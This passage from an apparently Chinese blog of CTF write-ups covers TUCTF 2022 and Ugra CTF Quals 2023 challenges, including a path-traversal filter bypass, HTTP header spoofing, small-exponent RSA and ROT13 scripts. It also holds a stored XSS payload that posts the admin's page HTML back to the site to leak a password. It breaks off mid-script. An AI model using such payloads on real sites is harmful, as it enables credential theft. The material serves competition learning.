<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052048569.png?x-oss-process=hzy" alt="image-20221205204824496"></p>
<p>看源码可以看到从一百到99跳转</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052050498.png?x-oss-process=hzy" alt="image-20221205205022438"></p>
<p>99-&gt;98跳转</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052051055.png?x-oss-process=hzy" alt="image-20221205205127006"></p>
<p>不难想到，应该需要跳转到1才是flag的页面，写个简单的脚本跑一下</p>
<pre><code class="hljs plaintext">import requests

s = requests.Session()

url = &quot;https://hyper-maze.tuctf.com/pages/&quot;

page = &quot;page_aesthetician100.html&quot;

for i in range(99):
    page = &quot;page_&quot;+(s.get(url+page).text.split(&quot;page_&quot;)[1].split(&quot;.html&quot;)[0])+&quot;.html&quot;
    print(page)</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052104967.png?x-oss-process=hzy" alt="image-20221205210414903"></p>
<p>跑完之后访问第一个页面page_lagenaria1.html，再看源码得到flag页面</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052104908.png?x-oss-process=hzy" alt="image-20221205210449854"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052105800.png?x-oss-process=hzy" alt="image-20221205210517749"></p>
<p>TUCTF{y0u_50lv3d_my_hyp3r73x7_m4z3_38157}</p>
<h2 id="vertical-traversal">Vertical Traversal</h2>
<blockquote>
<p>We recruited a rock to be our web application firewall.</p>
</blockquote>
<blockquote>
<p>hint:You are trying to find <code>flag.txt</code></p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052106087.png?x-oss-process=hzy" alt="image-20221205210637030"></p>
<p>初步断定应该是目录穿越</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052107521.png?x-oss-process=hzy" alt="image-20221205210709470"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052107865.png?x-oss-process=hzy" alt="image-20221205210732815"></p>
<p>测试一下有无过滤</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052108362.png?x-oss-process=hzy" alt="image-20221205210831309"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052108509.png?x-oss-process=hzy" alt="image-20221205210843461"></p>
<p>发现俩点会换成一个点，但是三个点真的只会变成俩点</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052110217.png?x-oss-process=hzy" alt="image-20221205211058158"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052111611.png?x-oss-process=hzy" alt="image-20221205211108558"></p>
<p>url编码一下</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052112021.png?x-oss-process=hzy" alt="image-20221205211234956"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052113427.png?x-oss-process=hzy" alt="image-20221205211315357"></p>
<p>成功绕过，直接读取flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052115362.png?x-oss-process=hzy" alt="image-20221205211503302"></p>
<pre><code class="hljs plaintext">TUCTF&#123;d0nt_us3_r3g3x_f0r_sanitization_416589&#125;</code></pre>
<h2 id="swapping-heads">Swapping Heads</h2>
<blockquote>
<p>Trying out a unique access process for my website. Can you get past it?</p>
<p>Note: Server time is computed using UTC+0</p>
</blockquote>
<p>访问题目</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052116727.png?x-oss-process=hzy" alt="image-20221205211648326"></p>
<p>head，所以我们可以试试抓包，直加入规定的时间</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052120023.png?x-oss-process=hzy" alt="image-20221205212009923"></p>
<p>这结果是问题不是2009的三月。修改UA头，改成2009.03发布的浏览器</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052122751.png?x-oss-process=hzy" alt="image-20221205212204657"></p>
<p>然后继续改，电子邮箱，加进去这个比赛的电子邮箱</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052123017.png?x-oss-process=hzy" alt="image-20221205212343929"></p>
<p>得到flag</p>
<p>TUCTF{s0_m@ny_h11p_h3@d3r5}</p>
<h1 id="cryptography">Cryptography</h1>
<h2 id="that-one-rsa-challenge">That One RSA Challenge</h2>
<blockquote>
<p>Every CTF needs an RSA challenge, right? This one is pretty easy, but it’s a good warmup for the harder ones.</p>
<p>nc <a href="http://chals.tuctf.com">chals.tuctf.com</a> 30003</p>
</blockquote>
<p>RSA解密，nc得到数据</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052045258.png?x-oss-process=hzy" alt="image-20221205204513171"></p>
<pre><code class="hljs plaintext">n:9485617987806706299131247776466066367809938974970055865380294247238770694891739867376223018874375879714997107037740309334952957232380620942369059299915046070326520804023632807969393450262857945485791854014950104444137529299258769400518631572400245843789419685432346975170642019241202057940814339369003423789312251289004158977581560819324386281826630693497886175987

e:5

c:3939576766768376763961405582521543334021934514950892859323028296903375959099172979885272281538172303841975145817998784463308709702183899488377424082851763106850349079809316431283635641105910994747748501769481061061860265928123380738805313890512159984000841962302724291349991025550366136992045593173221270436096235781550054498742353003142428431700520457366886751244</code></pre>
<p>直接爆破，脚本如下</p>
<pre><code class="hljs plaintext">from Crypto.Util.number import  *
import gmpy2


n=8346425840345037198129807199954937513125401478961025053438500009262959483940555502608532588666628916939574878135218855958821064838203228082983723434620238007105016628268464539273261229744292297640361962072437956843948295958466836540951955424109567151570099392506528987866673342131787718676889995125410609830917106914342065379286418563488386309724204814943128871119
e=5
c=890620492926502102321644049026872388378498414827953826131346197384557852833466825919448308696314073085933961953691570137956771071596742543745375687720240553544749955984069277312962665151448350105067655613387030994086162903274410383691948894524235546954806222699808006175418241236189457310283573332687555189286927373038549938732981897169435703218096242083962769102

for i in range(10000000):
    if gmpy2.iroot(c+(n*i),5)[1]:
        print(long_to_bytes(gmpy2.iroot(c+(n*i),5)[0]))</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202212052045776.png?x-oss-process=hzy" alt="image-20221205204549718"></p>
<p>b’TUCTF{0bl1g4t0ry_RSA_chall_l0l}’</p>
]]></content>
      <categories>
        <category>赛后复盘</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Ugra CTF Quals 2023</title>
    <url>/2023/01/16/Ugra%20CTF%20Quals%202023/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115214847796.png?x-oss-process=hzy" alt="image-20230115214847796"></p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>国外一比赛，质量很高，学习一下，和对象一块打了半天，第69名</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230116105218567.png?x-oss-process=hzy" alt="image-20230116105218567"></p>
<h1 id="web">WEB</h1>
<h2 id="трисекция">Трисекция</h2>
<blockquote>
<p>Три, три, три — будет?..</p>
<p><em>Обновлено 14 января в 14:05:</em> Задание немного упрощено — мы кое-что добавили.</p>
</blockquote>
<p>基础web题目，考察三部分内容，robots，http头，以及源码</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125443459.png?x-oss-process=hzy" alt="image-20230115125443459">、</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125456260.png?x-oss-process=hzy" alt="image-20230115125456260"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115125506897.png?x-oss-process=hzy" alt="image-20230115125506897"></p>
<p>第二部分提示是覆盖root下的robots.txt，即访问域名直接的robots.txt即可</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115190212187.png?x-oss-process=hzy" alt="image-20230115190212187"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115190258987.png?x-oss-process=hzy" alt="image-20230115190258987"></p>
<p>得到flag</p>
<p>ugra_triangles_are_cool_but_triflags_are_way_cooler_a5700fd552c0</p>
<h2 id="старые-добрые-времена">Старые добрые времена</h2>
<blockquote>
<p>Вася завел блог. Как полагается начинающему разработчику, написал он его с нуля. Покажите Васе, что он неправ.</p>
<p><em>Добавлено 15 января в 01:45:</em></p>
<p><strong>Подсказка.</strong> Флаг — пароль администратора.</p>
</blockquote>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231539655.png?x-oss-process=hzy" alt="image-20230115231539655"></p>
<p>一个评论系统，可以留言，XSS漏洞，利用XMLHttpRequest，模拟管理员发送贴，同时带出来admin自己这个页面的信息</p>
<pre><code class="hljs plaintext">&lt;script&gt;
var test= window.btoa(encodeURI(document.getElementsByTagName(&#x27;html&#x27;)[0].outerHTML));
x=new XMLHttpRequest();
x.open(&quot;POST&quot;,&quot;https://goodolddays.q.2023.ugractf.ru/y878adr0tffsr42v/post&quot;);
x.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);
x.send(&#x27;author=123&amp;content=&#x27;+test);
&lt;/script&gt;</code></pre>
<p>得到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231659353.png?x-oss-process=hzy" alt="image-20230115231659353"></p>
<p>url解码得到password即flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115231718783.png?x-oss-process=hzy" alt="image-20230115231718783"></p>
<p>ugra_stop_reinventing_the_wheel_8czeakgizqrd</p>
<h1 id="crypto">CRYPTO</h1>
<h2 id="водоворот">Водоворот</h2>
<blockquote>
<p>Это сообщение зашифровано 1337 раундами алгоритма ROT-13.</p>
</blockquote>
<p>将题目附件里的内容使用rot13加密1337次，用脚本解密1337次保存一下即可</p>
<pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">rot13</span>(<span class="hljs-params">s</span>):
    result = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-comment"># Loop over characters.</span>
    <span class="hljs-keyword">for</span> v <span class="hljs-keyword">in</span> s:
        <span class="hljs-comment"># Convert to number with ord.</span>
        c = <span class="hljs-built_in">ord</span>(v)
        <span class="hljs-comment"># Shift number back or forward.</span>
        <span class="hljs-keyword">if</span> c &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):
            <span class="hljs-keyword">if</span> c &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;m&#x27;</span>):
                c -= <span class="hljs-number">13</span>
            <span class="hljs-keyword">else</span>:
                c += <span class="hljs-number">13</span>
        <span class="hljs-keyword">elif</span> c &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-keyword">and</span> c &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>):
            <span class="hljs-keyword">if</span> c &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;M&#x27;</span>):
                c -= <span class="hljs-number">13</span>
            <span class="hljs-keyword">else</span>:
                c += <span class="hljs-number">13</span>
        <span class="hljs-comment"># Append to result.</span>
        result += <span class="hljs-built_in">chr</span>(c)
    <span class="hljs-comment"># Return transformation.</span>
    <span class="hljs-keyword">return</span> result

<span class="hljs-comment"># 将一段话进行rot13解密1337次</span>
s1 = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;ciphertext.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)
s=s1.read()
<span class="hljs-built_in">print</span>(s)
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1337</span>):
    s = rot13(s)

<span class="hljs-comment"># 保存结果</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
    f.write(s)</code></pre>
<p>保存之后的内容如下</p>
<blockquote>
<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean non aliquam eros. Curabitur non ullamcorper justo. Suspendisse auctor placerat accumsan. Nam vitae posuere augue. Donec sodales porta egestas. Nunc tincidunt, enim in luctus tincidunt, velit turpis tincidunt quam, sit amet vehicula mi diam nec nibh. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Phasellus venenatis a nulla eu sagittis. Nam faucibus convallis erat at iaculis. Maecenas mollis nunc quis gravida imperdiet.</p>
<p>Vivamus in laoreet enim. Curabitur justo mauris, gravida vel neque vitae, aliquet hendrerit augue. Aenean mi purus, fringilla ut consectetur ac, ornare ut erat. Suspendisse in justo sit amet augue suscipit hendrerit. Morbi pretium lorem quam, ut porttitor est maximus vel. Praesent quis porttitor eros, ut finibus augue. Aenean et rhoncus nisl. Nulla facilisi. Mauris sodales ipsum et turpis ullamcorper, eget facilisis ligula accumsan.</p>
<p>Aenean varius nisl mattis, hendrerit ligula quis, convallis lacus. Suspendisse purus sem, pulvinar ultrices luctus ut, vulputate eget nisi. Praesent bibendum rutrum hendrerit. Integer fermentum nisl eu sapien varius tincidunt ut non dolor. Mauris id lorem libero. Curabitur ullamcorper, lacus eu tristique ultricies, ligula risus pulvinar justo, nec mattis lacus lectus quis quam. Aliquam erat volutpat. Curabitur non felis enim. Fusce tincidunt, erat sit amet finibus volutpat, ligula libero finibus turpis, in ultricies mauris ante sed purus. Integer fermentum venenatis quam, molestie luctus nisl vehicula ut. Pellentesque tincidunt lectus interdum, ultrices neque vel, suscipit turpis. Pellentesque erat diam, sagittis eu lectus vitae, malesuada finibus tortor. Aenean id egestas augue, sit amet fermentum ipsum. Curabitur consectetur lacinia risus eu tempor. Vestibulum vitae nibh vel purus ultricies aliquet. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</p>
<p>Etiam maximus, elit non varius porta, risus neque ornare nisl, ut dapibus purus eros quis magna. Donec eget erat sit amet massa malesuada feugiat id sit amet lectus. In commodo vehicula dolor, quis laoreet neque varius sit amet. Vestibulum vitae auctor nisi. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia curae; Aenean vitae luctus turpis, vel dapibus purus. Suspendisse potenti. Pellentesque est ex, egestas in turpis non, accumsan venenatis dui. Morbi cursus lacus risus, ac congue odio porta vitae. Fusce pulvinar semper lorem, egestas iaculis lorem condimentum nec. Nullam tellus magna, dapibus quis fermentum eget, sodales vel turpis. Quisque quis dui nisi. Duis sollicitudin leo nec ultricies porttitor. Proin dapibus libero ornare magna consectetur tristique.</p>
<p>Donec et fringilla enim. Donec ut massa ultricies arcu venenatis ultricies. Ut ut congue eros. Maecenas ornare lobortis metus, luctus gravida ligula sodales non. Vivamus condimentum ut dui vel fringilla. Fusce ut odio sit amet nibh lacinia malesuada. Donec velit tortor, ullamcorper in erat et, cursus euismod arcu. Nam vitae justo in tortor laoreet bibendum vitae vitae enim. Sed ac ultricies turpis. Pellentesque luctus commodo molestie. Vestibulum ac pulvinar massa.</p>
<p>Proin nisl nulla, commodo eget vulputate eu, scelerisque in velit. Fusce elementum in augue ac blandit. Vestibulum id dictum massa. Nullam pulvinar dolor sit amet neque sodales condimentum. Mauris pulvinar fermentum leo, quis viverra nulla aliquet et. Nulla at nisi ultricies, auctor nibh a, elementum est. Suspendisse mattis pellentesque dui. Cras ullamcorper lacus ut urna feugiat laoreet congue eget lacus. Aliquam maximus arcu eu urna ornare, id bibendum purus molestie. Etiam hendrerit mollis egestas.</p>
<p>Curabitur sollicitudin nunc ac odio tempus, sit amet placerat tellus sodales. Pellentesque vitae tellus ac diam gravida venenatis. Fusce gravida, nulla in malesuada blandit, libero ipsum porttitor ante, eu scelerisque nunc odio quis velit. Nam sit amet enim in odio ultrices posuere. Duis iaculis consectetur dui. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Nulla ut risus augue. Nam consectetur interdum nisl, ut ultricies ipsum egestas sed.</p>
<p>Etiam eu diam at sapien tincidunt rutrum quis non est. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Etiam bibendum dignissim purus ac placerat. Cras ullamcorper, mi egestas lacinia faucibus, turpis erat tincidunt tortor, ut volutpat turpis ex vitae dolor. Nam imperdiet dolor sit amet lorem vestibulum, eu condimentum mi iaculis. Ut viverra nisi a ultricies pretium. Maecenas cursus lacus condimentum lectus convallis scelerisque. Sed pretium enim nec ligula consequat, eu venenatis enim efficitur. Pellentesque eros turpis, semper in massa quis, blandit pretium tortor. Nam sodales dignissim accumsan. Donec vitae nulla porta, varius augue nec, aliquam neque. Donec non aliquet nisl, euismod hendrerit est. Maecenas id ultrices metus, id pharetra mauris. Phasellus ut vulputate ante, a fermentum quam.</p>
<p>Nam rutrum ex non sapien facilisis, id cursus ante sollicitudin. Integer fringilla ugra_double_security_for_only_50_more_bucks_o2nvw9n27bgj consequat pellentesque. Aliquam elementum, neque in euismod luctus, nisi urna dictum ante, non imperdiet dui lorem accumsan leo. Curabitur metus arcu, vestibulum eget rhoncus a, luctus id velit. Nulla egestas libero nisi, vitae dictum risus ultricies vitae. Sed sit amet iaculis lorem. Ut mi purus, porttitor at euismod sed, porta ac massa. Nulla aliquet vel felis ac mattis. Duis erat urna, consectetur id sollicitudin at, vehicula et sapien. Morbi id mauris finibus, ullamcorper sem sed, ultrices libero.</p>
<p>Aliquam nulla metus, mollis et ex id, suscipit eleifend nisl. Proin sagittis lacus quis sodales tincidunt. Donec aliquet leo nibh, eu vehicula risus lacinia at. Nam at interdum massa. In feugiat, libero ut dignissim fringilla, arcu felis imperdiet dolor, a commodo diam quam sed libero. Phasellus placerat, lectus et euismod tristique, dolor erat vehicula tortor, in euismod ligula neque id lectus. Pellentesque vitae interdum lectus, ac tristique erat. Duis mi risus, tristique eu turpis at, congue pharetra purus. Cras risus leo, facilisis a venenatis id, mollis vel nisl.</p>
<p>Phasellus vel ligula feugiat lacus faucibus posuere quis nec massa. Suspendisse ante velit, elementum at dignissim vitae, dignissim a quam. Nunc ultrices metus in neque facilisis mattis. Ut mattis arcu velit, sit amet venenatis arcu iaculis ac. Fusce tempus sed erat vitae molestie. Maecenas posuere sit amet erat nec convallis. Fusce massa erat, pretium ut pellentesque in, porttitor varius sapien. Suspendisse lacus felis, tincidunt sed velit vel, blandit sodales libero. Aenean et nisl tellus. Etiam tristique metus quis ex pharetra viverra. Fusce quis mi facilisis, rhoncus enim a, congue orci. Duis auctor eros felis, a semper mauris congue eget. Fusce vehicula cursus quam sit amet auctor. Aenean aliquam, ipsum interdum elementum tempor, ante ex lobortis ex, egestas rhoncus velit diam et velit.</p>
<p>Ut consectetur tempor nibh, laoreet feugiat eros facilisis vel. Vestibulum a ligula metus. Pellentesque vehicula est nulla, facilisis dignissim magna varius quis. Phasellus hendrerit egestas risus quis accumsan. Pellentesque quis vulputate mauris. Donec quis congue felis. Sed id ex nisi. Curabitur a scelerisque arcu. Ut consequat laoreet nisl, eu aliquet risus semper at. Phasellus blandit metus eget ornare euismod. Phasellus lacinia magna quis consequat dapibus. Pellentesque tincidunt eros nec metus varius, quis finibus quam tempor. In maximus pretium nunc. Praesent id eros auctor, finibus nunc sed, commodo odio. Vivamus placerat laoreet est, nec elementum odio ultricies eu. Aliquam congue sem quis porta commodo.</p>
<p>Vestibulum iaculis scelerisque dolor, eget eleifend tortor bibendum condimentum. Fusce suscipit mi id sodales venenatis. Mauris ac imperdiet leo. Vivamus vitae consequat mauris, in pharetra orci. Proin in nibh ligula. Integer a varius erat. Proin euismod metus massa, ultricies suscipit ex posuere mollis. Suspendisse potenti. Phasellus ut diam ipsum. Sed arcu turpis, venenatis id vulputate vitae, ultricies non massa. Donec eget magna eget elit pharetra feugiat ac eget mi. Nam scelerisque metus massa, vitae eleifend turpis maximus eu. Curabitur aliquam odio et neque facilisis venenatis vitae sit amet massa.</p>
<p>Sed cursus nisi eu lorem pharetra ullamcorper. Ut pulvinar, sem a eleifend ultrices, sapien tellus sagittis justo, at sollicitudin dolor neque suscipit ex. Nulla consectetur elit elit, non faucibus diam sollicitudin non. Morbi iaculis tempus enim, porta fringilla enim auctor eu. Curabitur luctus lacinia mauris, non faucibus metus tempor rutrum. Fusce at egestas ligula, ac euismod diam. In sed blandit mi. Quisque fringilla consequat tellus. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Ut nec turpis elit.</p>
<p>Aenean luctus magna quis risus ullamcorper, at vestibulum ligula suscipit. Quisque venenatis lectus est. Duis euismod feugiat dolor vehicula consequat. Aliquam eu sapien libero. Morbi sit amet feugiat mi. Nullam sed lectus vel tellus sodales vehicula ut quis lorem. Suspendisse gravida, arcu id bibendum consequat, sapien massa tempus dui, sed vehicula ex dui nec purus. Nulla facilisi. Quisque finibus maximus placerat. Curabitur pulvinar est et gravida accumsan. Integer in hendrerit est. Nunc ac quam arcu. Aliquam erat volutpat. Mauris purus diam, consequat in velit dictum, cursus ultrices neque. Vestibulum luctus malesuada efficitur. Praesent aliquet elementum congue.</p>
<p>Mauris posuere posuere tortor. Etiam dictum at turpis eget iaculis. Quisque tortor ipsum, maximus et pretium ut, vehicula sed ligula. Nulla sed consequat ex, a mollis risus. Duis condimentum at urna vel fringilla. Donec varius, dolor sed interdum efficitur, orci sapien auctor turpis, consequat efficitur felis diam quis turpis. Donec laoreet, ante sed tincidunt euismod, metus tellus feugiat nulla, sed congue elit est a libero. Ut sollicitudin orci ut orci dapibus, sit amet accumsan risus luctus. Phasellus mollis lectus id mauris venenatis consequat ut sollicitudin urna. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Suspendisse potenti. In feugiat volutpat interdum. Aliquam lobortis tortor est, ac imperdiet felis mollis vel. Duis neque ligula, bibendum nec auctor a, hendrerit eget ante.</p>
<p>Mauris in commodo diam. Donec tellus ex, ultrices ut erat sed, placerat placerat tellus. Sed leo nunc, imperdiet eget sem a, auctor imperdiet massa. Praesent vitae feugiat tellus, id molestie orci. Vivamus vitae justo metus. Quisque sit amet nisi erat. Duis auctor nisi eu tellus feugiat, vel efficitur sapien aliquet. Maecenas metus nunc, posuere sit amet vestibulum ac, dictum vel arcu. Phasellus eu tellus eu erat blandit tincidunt a eu augue. Ut ac libero pretium, egestas tellus vel, pharetra erat. Aliquam sem nibh, accumsan at consectetur non, lobortis a tortor. Maecenas rhoncus ante quam, ac vestibulum nulla luctus vitae. Cras ac risus id turpis elementum tincidunt a quis orci. Vivamus in est fringilla, varius leo eu, tempus quam. Pellentesque vitae tristique mauris.</p>
<p>Proin id luctus libero. Nunc fringilla interdum diam. Morbi quam libero, semper quis lacus et, bibendum mattis risus. Aliquam vitae accumsan ipsum. Integer rhoncus diam eget odio egestas volutpat. Nunc est velit, dignissim sed auctor et, venenatis eget nisl. Maecenas dictum porttitor enim. Donec eget ipsum id magna faucibus ullamcorper eget sed massa.</p>
<p>Etiam congue tincidunt dolor nec vestibulum. Vivamus rhoncus erat sed felis suscipit, sit amet elementum tortor bibendum. Duis accumsan fringilla turpis at aliquet. Aenean leo quam, porta vitae euismod in, malesuada et risus. Mauris ante enim, rhoncus id velit vel, posuere imperdiet leo. Pellentesque iaculis tincidunt tortor, sit amet consequat nisl sollicitudin sit amet. Ut venenatis est mi, vitae pharetra arcu tincidunt non. Morbi et egestas ex. Suspendisse tincidunt magna a lorem vulputate rhoncus.</p>
<p>Quisque urna felis, imperdiet quis urna a, placerat sodales libero. Curabitur eleifend luctus turpis vitae ultrices. Sed vel dapibus dui, sed tempus leo. Nullam sed turpis enim. Maecenas vel molestie augue. Suspendisse tincidunt lorem nisi, eu tincidunt elit lobortis quis. Quisque eu imperdiet lectus. Mauris porta arcu diam, et rhoncus massa euismod a. Etiam at orci odio. Nullam tincidunt vehicula erat, a bibendum risus gravida id. Fusce facilisis elit lacus, at gravida neque volutpat et. Praesent sollicitudin ut justo vel dictum. Phasellus ante lectus, vestibulum eget molestie vel, lacinia et risus. Etiam non condimentum lorem. Donec dolor dui, faucibus a enim ut, vehicula tristique purus.</p>
</blockquote>
<p>得到flag</p>
<p>ugra_double_security_for_only_50_more_bucks_o2nvw9n27bgj</p>
<h1 id="forensics">FORENSICS</h1>
<h2 id="захват-трафика">Захват трафика</h2>
<blockquote>
<p>Нам удалось перехватить секретную передачу данных. Есть ли в ней что-то интересное?</p>
</blockquote>
<p>流量分析，导出一个图片即flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115133628036.png?x-oss-process=hzy" alt="image-20230115133628036"></p>
<p>ugra_traffic_extractor_0ae1c61ce023</p>
<h1 id="stegano">STEGANO</h1>
<h2 id="музыкальная-пятиминутка">Музыкальная пятиминутка</h2>
<blockquote>
<p>В конце рабочего дня — самое то!</p>
</blockquote>
<p>一个音频，主要在音频上的图片上</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115172318071.png?x-oss-process=hzy" alt="image-20230115172318071"></p>
<p>从ugra开始连线到最后拼一块就是flag</p>
<p>ugra_we_support_local_artists_f6f385</p>
<h1 id="misc">MISC</h1>
<h2 id="поле-для-сдачи-флага">Поле для сдачи флага</h2>
<blockquote>
<p>А вы прочитали правила олимпиады? Тогда вы уже должны знать хотя бы один флаг.</p>
<p>Осталось только найти, куда же его сдать.</p>
</blockquote>
<p>看规则有flag</p>
<p>ugra_ex4mpl3</p>
<h1 id="ppc">PPC</h1>
<h2 id="глубина">Глубина</h2>
<blockquote>
<p>У каждого есть знакомый с под сотней файлов на рабочем столе. Но, оказывается, бывает и хуже…</p>
</blockquote>
<p>进去之后是</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115180833066.png?x-oss-process=hzy" alt="image-20230115180833066"></p>
<p>不难发现就是选有标签的一直循环下去直到结束，选错了的话就是一句话</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/image-20230115180907549.png?x-oss-process=hzy" alt="image-20230115180907549"></p>
<p>用我这仅有的python功底写了个脚本来跑</p>
<pre><code class="hljs plaintext"># -*- coding: utf-8 -*-
import requests
from bs4 import BeautifulSoup
import time
import re

i=0
url = &#x27;https://depth.q.2023.ugractf.ru/pn4p0p46xjfno0zv/scheming_viper/wireless_cottonmouth/pearl_welder/killer_filly/orange_panther/ivory_screwdriver/orbiting_weapon/urban_moose/orbiting_harp/jade_warning/warring_python/searching_song/dangerous_nomad/explosive_gazelle/dangerous_leopard/stalking_barnacle/rowdy_chain/warring_motherboard/orbiting_chef/unnecessary_elk/opal_rhythm/bad_mixer/rowdy_cornet/opal_nomad/pearl_network/revealing_network/amber_cleric/explosive_commander/rowdy_trumpet/tundra_captain/orbiting_wrench/amber_camera/revealing_weapon/diamond_cleric/flying_player/rowdy_storm/revealing_rhythm/hunting_camera/orange_wildcat/tarnished_router/unknown_pegasus/bone_fairy/unknown_weapon/agate_horse/destroyed_troll/stalking_wrench/uncanny_mermaid/draconic_lobster/nacre_cheetah/coral_door/agate_general/yellow_nomad/urban_jackal/orange_mermaid/jet_hail/draconic_pony/unnecessary_commander/tarnished_battery/rowdy_general/green_tape/rowdy_mill/orbiting_device/blue_rhythm/ruby_deer/orbiting_welder/draconic_gelding/decisive_wizard/hunting_yeti/space_mermaid/unexpected_lion/hunting_welder/covert_nomad/jet_flute/scheming_tiger/destroyed_sound/amber_mare/glass_cartridge/mountain_tuba/threatening_projector/waning_cornet/destroyed_zebra/unknown_pony/ivory_violin/scheming_grizzly/desert_clarinet/wireless_projector/draconic_horse/orange_rhythm/ruby_stallion/onyx_compressor/warring_fairy/waning_yearling/hidden_pilot/urban_rhythm/diamond_thunder/obsidian_wrench/dangerous_lathe/stalking_nomad/obsidian_memory/warring_camera/decisive_wrench/destroyed_tiger/searching_compressor/nacre_admiral/bad_unicorn/wireless_beat/desert_yeti/orange_gazelle/violet_leopard/pearl_mill/bone_elk/warring_wizard/blue_tuba/diamond_rain/ivory_stag/blue_warning/orbiting_panther/bad_flute/nacre_cottonmouth/chasing_weapon/searching_boa/opal_elk/wild_jackal/unknown_projector/jet_lion/dangerous_transistor/decisive_hammerhead/sapphire_compressor/yellow_mask/hidden_hail/scheming_admiral/space_stag/amber_wizard/jet_chain/onyx_drill/explosive_door/beryl_chain/obsidian_cyborg/orange_hail/onyx_screwdriver/space_chef/wild_tiger/emerald_drought/orange_harp/jet_cyborg/falling_stallion/ivory_hail/unexpected_cottonmouth/desert_sidewinder/green_packet/emerald_barnacle/insane_battery/urban_general/space_case/bone_guitar/bad_major/tarnished_tiger/unnecessary_memory/sapphire_stallion/yellow_lightning/emerald_cello/tundra_elk/unexpected_yeti/desert_lobster/untouchable_device/inconceivable_wizard/coral_moose/decisive_device/red_commander/draconic_guitar/glass_yeti/killer_wildcat/agate_sander/rowdy_cleric/dangerous_chef/desert_welder/chasing_mixer/tarnished_router/jade_projector/falling_drill/rowdy_vacuum/tarnished_hammer/red_elk/pearl_filly/chasing_cobra/violet_mill/unknown_filly/beryl_horn/diamond_dragon/chasing_pegasus/destroyed_rain/ambe